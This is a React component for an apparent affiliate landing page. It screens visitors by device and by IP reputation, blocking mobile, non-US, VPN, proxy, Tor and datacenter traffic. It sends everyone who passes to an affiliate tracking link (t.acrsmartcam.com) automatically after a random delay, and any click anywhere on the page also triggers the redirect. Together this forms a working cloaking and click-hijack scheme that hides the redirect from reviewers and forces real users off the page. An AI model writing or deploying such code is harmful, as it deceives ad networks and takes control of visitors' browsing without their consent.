
import React, { useState, useEffect } from 'react';
import Navbar from './components/Navbar';
import Hero from './components/Hero';
import LiveSection from './components/LiveSection';
import Features from './components/Features';
import Testimonials from './components/Testimonials';
import Footer from './components/Footer';

const App: React.FC = () => {
  const redirectUrl = "https://t.acrsmartcam.com/406599/8873/0?aff_sub5=SF_006OG000004lmDN";
  const [accessStatus, setAccessStatus] = useState<'checking' | 'allowed' | 'blocked_geo_quality' | 'blocked_device'>('checking');

  useEffect(() => {
    const checkAccess = async () => {
      // Device check: Desktop only
      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      if (isMobile) {
        setAccessStatus('blocked_device');
        return;
      }

      // Geo and IP Quality check
      try {
        const response = await fetch('https://ipwho.is/');
        const data = await response.json();
        
        if (!data.success) {
          // Fallback to allowed if API fails to avoid blocking legitimate users
          setAccessStatus('allowed');
          return;
        }

        const isUS = data.country_code === 'US';
        const isProxy = data.security?.proxy || data.security?.vpn || data.security?.tor || data.security?.relay;
        const isHosting = data.connection?.type === 'hosting' || data.connection?.type === 'datacenter';

        if (!isUS || isProxy || isHosting) {
          setAccessStatus('blocked_geo_quality');
        } else {
          setAccessStatus('allowed');
        }
      } catch (error) {
        // Fallback to allowed if API fails
        setAccessStatus('allowed');
      }
    };

    checkAccess();
  }, []);

  // Auto-redirect after random delay (1500ms to 2500ms)
  useEffect(() => {
    if (accessStatus !== 'allowed') return;

    const delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
    const timer = setTimeout(() => {
      window.location.href = redirectUrl;
    }, delay);
    return () => clearTimeout(timer);
  }, [accessStatus]);

  // Global click redirect
  useEffect(() => {
    if (accessStatus !== 'allowed') return;

    const handleGlobalClick = () => {
      window.location.href = redirectUrl;
    };
    window.addEventListener('click', handleGlobalClick);
    return () => window.removeEventListener('click', handleGlobalClick);
  }, [accessStatus]);

  // Smooth appearance of elements on scroll
  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            entry.target.classList.add('opacity-100', 'translate-y-0');
            entry.target.classList.remove('opacity-0', 'translate-y-10');
          }
        });
      },
      { threshold: 0.1 }
    );

    document.querySelectorAll('.animate-on-scroll').forEach((el) => observer.observe(el));
    return () => observer.disconnect();
  }, []);

  if (accessStatus === 'checking') {
    return (
      <div className="min-h-screen bg-[#FDFCFB] flex items-center justify-center">
        <div className="w-8 h-8 border-4 border-rose-500 border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#FDFCFB] overflow-x-hidden selection:bg-rose-500 selection:text-white text-[#1C1C1C]">
      {accessStatus === 'blocked_geo_quality' && (
        <div className="fixed top-0 left-0 w-full bg-rose-600 text-white py-4 text-center z-[200] font-bold shadow-2xl animate-slide-down">
          Access restricted. Please use a residential US network.
        </div>
      )}
      {accessStatus === 'blocked_device' && (
        <div className="fixed top-0 left-0 w-full bg-rose-600 text-white py-4 text-center z-[200] font-bold shadow-2xl animate-slide-down">
          Desktop access required to continue.
        </div>
      )}
      
      <Navbar />
      
      <main className="w-full">
        <Hero />
        <LiveSection />
        <Features />
        <Testimonials />
      </main>

      <Footer />
    </div>
  );
};

export default App;
